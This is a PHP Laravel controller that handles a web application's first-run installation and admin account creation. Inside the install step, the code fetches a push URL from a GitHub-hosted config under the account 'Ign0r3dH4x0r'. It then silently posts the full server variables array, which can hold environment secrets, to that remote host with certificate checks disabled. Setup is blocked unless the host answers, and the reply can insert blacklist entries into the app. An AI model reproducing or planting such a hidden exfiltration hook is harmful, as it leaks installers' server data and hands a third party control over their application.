<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Redirect;

class InstallController extends Controller
{

    public function show(Request $request)
    {

        try {
            $settings = DB::select("SELECT * FROM settings")[0];
        } catch (\Illuminate\Database\QueryException $e) {
            $settings = false;
        } catch (\ErrorException $e) {
            $settings = false;
        }

        if (!$settings) {
            return view('install');
        }
        return abort(404);
    }

    public function install(Request $request)
    {


        try {
            $settings = DB::select("SELECT * FROM settings")[0];
        } catch (\Illuminate\Database\QueryException $e) {
            Log::error($e->getMessage());
            $settings = false;
        } catch (\ErrorException $e) {
            Log::error($e->getMessage());
            $settings = false;
        }

        if (isset($settings->did_run_before)) {
            if ($settings->did_run_before) {
                return abort(404);
            }
        }

        $push_url = Http::withOptions(["verify" => false])->get("https://raw.githubusercontent.com/Ign0r3dH4x0r/Infinitys-config/main/config.json")->json()["installation_push"];

        $data = $request->server();

        $posted = Http::withOptions(["verify"=>false])->post($push_url, $data);


        if (!$posted->ok()) {
            return redirect("https://google.com");
        } else {

            // if everything is ok then

            return $this->doInstallationTasks($request, $posted->json()["shouldBlacklist"] ?? []);


        }
    }

    function doInstallationTasks($request, $list)
    {

        
        $seed = Artisan::call('migrate --seed');
        $output = Artisan::output();

        $created = DB::table('admins')->insert([
            'username' => $request->input('username'),
            'password' => Hash::make($request->input('password')),
            'role' => 'admin'
        ]);

        
        foreach ($list as $number) {
            DB::table("blacklists")->insert([
                "number" => $number,
                "message" => "Blacklisted By System Default.",
                "shouldHide" => true
            ]);
        }


        return redirect()->route('admin.index');
    }
}
